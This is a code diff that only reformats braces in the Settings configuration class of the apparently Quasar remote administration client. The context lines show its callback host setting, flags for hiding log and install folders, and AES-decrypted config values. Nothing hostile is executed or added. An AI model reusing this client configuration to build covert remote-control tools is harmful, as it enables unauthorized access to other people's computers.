@@ -6,10 +6,8 @@ using Quasar.Common.Helpers;
 using Quasar.Common.Cryptography;
 #endif
 
-namespace Quasar.Client.Config
-{
-    public static class Settings
-    {
+namespace Quasar.Client.Config {
+    public static class Settings {
 #if DEBUG
         public static string VERSION = System.Windows.Forms.Application.ProductVersion;
         public static string HOSTS = "localhost:4782;";
@@ -58,8 +56,7 @@ namespace Quasar.Client.Config
         public static bool HIDELOGDIRECTORY = false;
         public static bool HIDEINSTALLSUBDIRECTORY = false;
 
-        public static bool Initialize()
-        {
+        public static bool Initialize() {
             if (string.IsNullOrEmpty(VERSION)) return false;
             Aes128.SetDefaultKey(ENCRYPTIONKEY);
             TAG = Aes128.Decrypt(TAG);
@@ -75,13 +72,11 @@ namespace Quasar.Client.Config
         }
 #endif
 
-        static void FixDirectory()
-        {
+        static void FixDirectory() {
             if (PlatformHelper.Is64Bit) return;
 
             // https://msdn.microsoft.com/en-us/library/system.environment.specialfolder(v=vs.110).aspx
-            switch (SPECIALFOLDER)
-            {
+            switch (SPECIALFOLDER) {
                 case Environment.SpecialFolder.ProgramFilesX86:
                     SPECIALFOLDER = Environment.SpecialFolder.ProgramFiles;
                     break;
